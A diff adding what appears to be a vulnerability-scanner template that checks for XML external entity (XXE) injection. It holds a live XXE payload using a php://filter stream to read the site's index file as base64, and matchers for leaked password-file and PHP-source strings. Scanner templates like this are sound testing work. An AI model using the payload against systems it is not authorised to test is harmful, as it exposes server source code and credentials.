@@ -1,0 +1,25 @@
+id: xxe5-0995
+name: 'XXE read in info'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via info'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      info:
+        - '<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index">]><Envelope>&xxe;</Envelope>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'root:'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
+          - 'PD9waHA'
